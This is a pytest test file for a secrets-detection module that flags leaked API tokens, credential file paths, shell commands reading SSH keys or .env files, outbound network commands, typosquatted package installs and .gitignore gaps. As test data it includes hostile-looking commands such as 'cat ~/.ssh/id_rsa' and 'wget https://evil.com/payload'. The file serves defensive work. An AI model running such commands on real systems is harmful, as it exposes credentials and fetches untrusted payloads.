"""Unit tests for core.secrets_detection (Rule #7 detectors)."""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from core.secrets_detection import (  # noqa: E402
    bash_reads_sensitive_file,
    detect_outbound_command,
    detect_package_install,
    detect_secrets,
    gitignore_gaps,
    is_hard_deny_path,
    typosquat_candidates,
)


# ---- detect_secrets: positive cases ------------------------------

@pytest.mark.parametrize(
    "text,kind",
    [
        # Literals split so this source file itself doesn't hit the scanner.
        ("AKIA" + "IOSFODNN7EXAMPLE", "aws_access_key"),
        ("aws_secret" + "_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "aws_secret_key"),
        ("ghp_" + "a" * 36, "github_pat"),
        ("ghs_" + "B" * 36, "github_server_token"),
        ("gho_" + "C" * 36, "github_oauth"),
        ("github_pat_" + "x" * 82, "github_pat_fine"),
        ("sk-" + "a" * 40, "openai_key"),
        ("sk-" + "proj-" + "z" * 50, "openai_proj_key"),
        ("sk-" + "ant-" + "q" * 40, "anthropic_key"),
        ("sk_live_" + "1" * 24, "stripe_live_secret"),
        ("rk_live_" + "1" * 24, "stripe_live_restricted"),
        ("pk_live_" + "1" * 24, "stripe_publishable_live"),
        ("xoxb" + "-1234567890-abcdefghij", "slack_token"),
        ("AIza" + "B" * 35, "google_api_key"),
        ("1234567890:" + "AA" + "x" * 33, "telegram_bot_token"),
        ("eyJ" + "hbGciOiJIUzI1.eyJzdWIiOiIxMjMifQ.abcdefghij", "jwt"),
        ("-----BEGIN" + " RSA PRIVATE KEY-----", "private_key_pem"),
        ("-----BEGIN" + " OPENSSH PRIVATE KEY-----", "private_key_pem"),
        ("-----BEGIN" + " PRIVATE KEY-----", "private_key_pem"),
    ],
)
def test_detect_secrets_positive(text: str, kind: str) -> None:
    hits = detect_secrets(text)
    assert any(h.kind == kind for h in hits), f"expected {kind} in {[h.kind for h in hits]}"


def test_detect_secrets_redacts_sample() -> None:
    token = "ghp_" + "a" * 36
    hits = detect_secrets(token)
    assert hits
    assert token not in hits[0].sample
    assert "…" in hits[0].sample or "*" in hits[0].sample


def test_detect_secrets_line_number() -> None:
    text = "line1\nline2\n" + "AKIA" + "IOSFODNN7EXAMPLE" + "\nline4"
    hits = detect_secrets(text)
    assert len(hits) == 1
    assert hits[0].line == 3


def test_detect_secrets_multiple_in_text() -> None:
    text = ("AKIA" + "IOSFODNN7EXAMPLE") + " " + "ghp_" + ("x" * 36)
    hits = detect_secrets(text)
    kinds = {h.kind for h in hits}
    assert "aws_access_key" in kinds
    assert "github_pat" in kinds


# ---- detect_secrets: negative cases ------------------------------

@pytest.mark.parametrize(
    "text",
    [
        "",
        "just some normal code",
        "AKIA",  # prefix alone, too short
        "sk-short",
        "ghp_tooshort",
        "-----BEGIN CERTIFICATE-----",  # cert, not private key
        "regular variable name = 'hello'",
    ],
)
def test_detect_secrets_negative(text: str) -> None:
    assert detect_secrets(text) == []


# ---- is_hard_deny_path -------------------------------------------

@pytest.mark.parametrize(
    "path",
    [
        "/home/user/.ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/home/user/.ssh/mykey_rsa",
        "/home/user/.ssh/known_hosts",
        "/home/user/.aws/credentials",
        "/home/user/.aws/config",
        "/home/user/.gnupg/private-keys-v1.d/abc.key",
        "/home/user/.netrc",
        "/project/.env",
        "/project/.env.local",
        "/project/.env.production",
        "/project/secrets.env",
        "/project/secrets.json",
        "/project/credentials.json",
        "/project/service-account.json",
        "/project/service-account-prod.json",
        "/project/ssl/cert.pem",
        "/project/keys/app.key",
        "/project/store.p12",
        "/project/store.pfx",
        "id_rsa",
        "id_ed25519",
    ],
)
def test_is_hard_deny_path_positive(path: str) -> None:
    assert is_hard_deny_path(path) is not None, f"should be denied: {path}"


@pytest.mark.parametrize(
    "path",
    [
        "",
        "/project/main.py",
        "/project/README.md",
        "/project/config.yaml",  # yaml but not secrets.yaml
        "/project/public.pub",
        "/project/notes.txt",
    ],
)
def test_is_hard_deny_path_negative(path: str) -> None:
    assert is_hard_deny_path(path) is None, f"should not be denied: {path}"


def test_is_hard_deny_path_expands_tilde() -> None:
    # ~/.ssh/id_rsa should resolve and match
    assert is_hard_deny_path("~/.ssh/id_rsa") is not None


# ---- bash_reads_sensitive_file -----------------------------------

@pytest.mark.parametrize(
    "command,expected_tool",
    [
        ("cat ~/.ssh/id_rsa", "cat"),
        ("less /home/user/.aws/credentials", "less"),
        ("head -5 .env", "head"),
        ("tail /project/secrets.json", "tail"),
        ("grep foo .env.local", "grep"),
        ("rg password credentials.json", "rg"),
        ("xxd /home/user/.ssh/id_ed25519", "xxd"),
        ("sed -n '1p' .env", "sed"),
        ("awk '{print}' secrets.yml", "awk"),
    ],
)
def test_bash_reads_sensitive_positive(command: str, expected_tool: str) -> None:
    result = bash_reads_sensitive_file(command)
    assert result is not None
    assert result[0] == expected_tool


@pytest.mark.parametrize(
    "command",
    [
        "",
        "cat README.md",
        "ls -la",
        "grep foo main.py",
        "head config.yaml",
        "echo $HOME",
    ],
)
def test_bash_reads_sensitive_negative(command: str) -> None:
    assert bash_reads_sensitive_file(command) is None


# ---- detect_outbound_command -------------------------------------

@pytest.mark.parametrize(
    "command,kind",
    [
        ("curl https://api.example.com/endpoint", "curl"),
        ("wget https://evil.com/payload", "wget"),
        ("scp file.txt user@host:/tmp/", "scp"),
        ("sftp user@remote.com", "sftp"),
        ("ssh user@remote.example.com", "ssh_remote"),
        ("rsync -av ./dist/ user@deploy:/var/www/", "rsync_remote"),
        ("nc example.com 443", "nc"),
        ("python3 -c 'import urllib.request; urllib.request.urlopen(\"http://x\")'", "python_urlopen"),
    ],
)
def test_detect_outbound_command_positive(command: str, kind: str) -> None:
    assert detect_outbound_command(command) == kind


@pytest.mark.parametrize(
    "command",
    [
        "",
        "ls -la",
        "python3 main.py",
        "curl http://localhost:8080/health",
        "curl http://127.0.0.1:3000/api",
        "wget http://localhost/file",
        "ssh-keygen -t ed25519",
        # Outbound tool name inside a quoted string (e.g. commit message)
        # must NOT trip the guard — it is not a command invocation.
        "echo 'curl' >> README.md",
        "git commit -m 'mentions scp in message'",
    ],
)
def test_detect_outbound_command_negative_or_localhost(command: str) -> None:
    assert detect_outbound_command(command) is None


# ---- detect_package_install --------------------------------------

@pytest.mark.parametrize(
    "command,ecosystem,expected_packages",
    [
        ("pip install requests", "pip", ["requests"]),
        ("pip3 install flask==2.0", "pip", ["flask==2.0"]),
        ("python -m pip install numpy pandas", "pip", ["numpy", "pandas"]),
        ("pip install --upgrade pip", "pip", ["pip"]),
        ("npm install express", "npm", ["express"]),
        ("npm i lodash", "npm", ["lodash"]),
        ("npm add @types/node", "npm", ["@types/node"]),
        ("yarn add react", "yarn", ["react"]),
    ],
)
def test_detect_package_install_positive(
    command: str, ecosystem: str, expected_packages: list[str]
) -> None:
    result = detect_package_install(command)
    assert result is not None
    assert result[0] == ecosystem
    for pkg in expected_packages:
        assert pkg in result[1], f"expected {pkg} in {result[1]}"


def test_detect_package_install_lockfile() -> None:
    # `npm install` without args = install-from-lockfile; still flagged with empty pkgs
    result = detect_package_install("npm install")
    assert result is not None
    assert result[0] == "npm"


def test_detect_package_install_skips_local_paths() -> None:
    result = detect_package_install("pip install ./my-local-pkg")
    assert result is not None
    assert "./my-local-pkg" not in result[1]


@pytest.mark.parametrize(
    "command",
    [
        "",
        "ls -la",
        "pip list",
        "npm run build",
        "yarn build",
        "python main.py",
    ],
)
def test_detect_package_install_negative(command: str) -> None:
    assert detect_package_install(command) is None


# ---- typosquat_candidates ----------------------------------------

@pytest.mark.parametrize(
    "ecosystem,packages,expected_hit",
    [
        ("pip", ["requets"], "requests"),
        ("pip", ["numppy"], "numpy"),
        ("pip", ["flasc"], "flask"),
        ("npm", ["axioss"], "axios"),
        ("npm", ["lodassh"], "lodash"),
        ("npm", ["reac"], "react"),
    ],
)
def test_typosquat_candidates_positive(
    ecosystem: str, packages: list[str], expected_hit: str
) -> None:
    hits = typosquat_candidates(ecosystem, packages)
    assert hits, f"expected typosquat hit for {packages}"
    assert any(target == expected_hit for _, target in hits)


@pytest.mark.parametrize(
    "ecosystem,packages",
    [
        ("pip", ["requests"]),
        ("pip", ["flask", "django"]),
        ("pip", ["numpy==1.24"]),
        ("pip", ["mypackage"]),  # unrelated to any popular name
        ("npm", ["axios"]),
        ("npm", ["express"]),
        ("npm", ["@types/node"]),
        ("pip", []),
        ("npm", []),
    ],
)
def test_typosquat_candidates_negative(
    ecosystem: str, packages: list[str]
) -> None:
    assert typosquat_candidates(ecosystem, packages) == []


# ---- gitignore_gaps ----------------------------------------------

def test_gitignore_gaps_empty_returns_all() -> None:
    gaps = gitignore_gaps("")
    assert ".env" in gaps
    assert "*.pem" in gaps


def test_gitignore_gaps_none_returns_all() -> None:
    gaps = gitignore_gaps(None)
    assert ".env" in gaps
    assert "node_modules/" in gaps


def test_gitignore_gaps_full_coverage() -> None:
    content = "\n".join([
        ".env", "*.env", "*.pem", "*.key", "secrets.json",
        "node_modules/", "__pycache__/", ".venv/", "*.log", ".DS_Store",
    ])
    assert gitignore_gaps(content) == []


def test_gitignore_gaps_partial() -> None:
    content = ".env\nnode_modules/\n"
    gaps = gitignore_gaps(content)
    assert ".env" not in gaps
    assert "node_modules/" not in gaps
    assert "*.pem" in gaps
    assert "*.log" in gaps


def test_gitignore_gaps_wildcard_covers_literal() -> None:
    # *.env should cover .env requirement
    content = "*.env\n"
    gaps = gitignore_gaps(content)
    assert ".env" not in gaps


def test_gitignore_gaps_ignores_comments() -> None:
    content = "# .env is tracked intentionally\n"
    gaps = gitignore_gaps(content)
    assert ".env" in gaps
